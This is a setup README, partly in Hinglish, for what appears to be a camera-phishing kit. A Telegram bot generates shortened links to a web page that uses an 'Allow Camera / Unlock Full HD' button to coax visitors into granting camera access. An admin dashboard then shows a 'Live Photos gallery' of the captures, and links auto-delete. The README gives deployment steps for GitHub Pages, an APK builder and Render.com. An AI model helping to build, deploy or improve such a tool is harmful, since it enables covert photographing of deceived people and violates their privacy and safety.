================================================================
Elite Full Controller System Package (Optimized & Clean)
================================================================

1. WHAT IS INCLUDED IN THIS ARCHIVE:
   - `bot.py`: Telegram Bot with 4-channel join verification, Front/Back
     camera selector, HD Photo / Video theme selector, TinyURL shortener,
     5-minute auto-delete, and built-in Flask web server for Render 24/7 cloud.
   - `index.html`: Client web page with visible "Allow Camera / Unlock Full HD"
     action button (satisfies mobile browser gesture requirements),
     sync progress bar, and rate-limit safe capture.
   - `dashboard.html`: Admin Controller APK interface with Camera mode
     switch (Front/Back), Theme switch, One-click Copy, Recent Links History,
     and Live Photos gallery.
   - `Procfile`: Config file for Render.com web service deployment.
   - `requirements.txt`: Python package requirements (`pyTelegramBotAPI`, `requests`, `flask`).

2. GITHUB PAGES DEPLOYMENT:
   - Apni GitHub repo `Box` me `index.html` aur `dashboard.html` upload karein.
   - Live URLs:
     * Viewer: https://elitevishal.github.io/Box/
     * APK Controller: https://elitevishal.github.io/Box/dashboard.html

3. APPCREATOR24 APK BUILD:
   - AppCreator24 me naya web app banayein aur URL me dalein:
     `https://elitevishal.github.io/Box/dashboard.html`
   - APK build karke apne phone me install kar lein.

4. 24/7 CLOUD HOSTING (RENDER.COM):
   - GitHub par private repo banakar `bot.py`, `Procfile`, `requirements.txt` upload karein.
   - Render.com par New Web Service connect karein.
   - Build Command: `pip install -r requirements.txt`
   - Start Command: `python bot.py`
